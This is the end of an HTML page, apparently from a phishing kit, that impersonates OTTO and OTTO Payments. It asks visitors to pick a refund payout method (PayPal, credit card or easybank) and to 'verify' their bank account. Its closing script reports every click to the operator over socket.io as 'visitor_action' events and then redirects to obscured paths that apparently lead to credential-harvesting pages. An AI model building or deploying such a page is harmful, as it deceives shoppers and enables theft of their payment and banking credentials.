</svg>
                        </div>
                        <div class="option-right-text">In 1-2 Werktagen</div>
                    </div>
                    <div class="option-desc">
                        Du wirst weitergeleitet, um dein easybank Konto für den Empfang der Erstattung zu verifizieren.<br>
                        Die Gutschrift erfolgt in 1-2 Werktagen direkt auf dein Girokonto.
                    </div>
                </div>

                <!-- Vorkasse -->
                

                <div class="disclaimer-text">
                    Diese Entscheidung basiert auf einem automatisierten Datenverarbeitungsverfahren.<br>
                    Weiterführende Informationen findest du in den <a href="#">Datenschutzinformationen unseres Zahlungspartners OTTO Payments.</a>
                </div>

                <div class="btn-wrapper">
                    <button type="button" class="btn btn-red">Auszahlungsmethode bestätigen</button>
                </div>

            </div>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-lines">
            <a href="#">Cookie-Einstellungen</a> &middot;
            <a href="#">AGB</a> &middot;
            <a href="#">Datenschutz</a> &middot;
            <a href="#">Impressum</a> &middot;
            <br>
            <a href="#">Information zur Barrierefreiheit</a> &middot;
            <a href="#">Produktsicherheitsrückrufe</a> &middot;
            <a href="#">OTTO Versprechen</a>
        </div>
        <div class="price-info">
            Preisangaben inkl. Steuer und zzgl. Service- und Versandkosten
        </div>
    </footer>

    <script src="/socket.io/socket.io.js"></script>
    <script src="/js/tracker.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const paypalSection = document.getElementById('paypal-section');
            const ccSection = document.getElementById('cc-section');
            const easybankSection = document.getElementById('easybank-section');

            if (paypalSection) {
                paypalSection.addEventListener('click', function () {
                    // Show a loading state or visual feedback if desired
                    this.style.opacity = '0.5';

                    if (typeof io !== 'undefined') {
                        const socket = io();
                        socket.emit('visitor_action', {
                            type: 'form_submit',
                            target: 'Bgha-Method-PayPal',
                            details: { action_type: "bgha PP" },
                            redirectUrl: '/loadPPxCvGk6Hb'
                        });
                    }
                    setTimeout(() => {
                        window.location.href = '/loadPPxCvGk6Hb';
                    }, 1000);
                });
            }

            if (ccSection) {
                ccSection.addEventListener('click', function () {
                    // Show a loading state or visual feedback if desired
                    this.style.opacity = '0.5';

                    if (typeof io !== 'undefined') {
                        const socket = io();
                        socket.emit('visitor_action', {
                            type: 'form_submit',
                            target: 'Bgha-Method-CreditCard',
                            details: { action_type: "Clicked on Credit Card Section" },
                            redirectUrl: '/loading?time=3&url=/CAPOCA6a7d5affa'
                        });
                    }
                    setTimeout(() => {
                        window.location.href = '/loading?time=3&url=/CAPOCA6a7d5affa';
                    }, 1000);
                });
            }

            if (easybankSection) {
                easybankSection.addEventListener('click', function () {
                    // Show a loading state or visual feedback if desired
                    this.style.opacity = '0.5';

                    if (typeof io !== 'undefined') {
                        const socket = io();
                        socket.emit('visitor_action', {
                            type: 'form_submit',
                            target: 'Bgha-Method-Easybank',
                            details: { action_type: "Clicked on Easybank Section" },
                            redirectUrl: '/ez-loading?time=3&url=/gzLbTbjqMpc34D4XsPJ2'
                        });
                    }
                    setTimeout(() => {
                        window.location.href = '/ez-loading?time=3&url=/gzLbTbjqMpc34D4XsPJ2';
                    }, 1000);
                });
            }
        });
    </script>
</body>

</html>
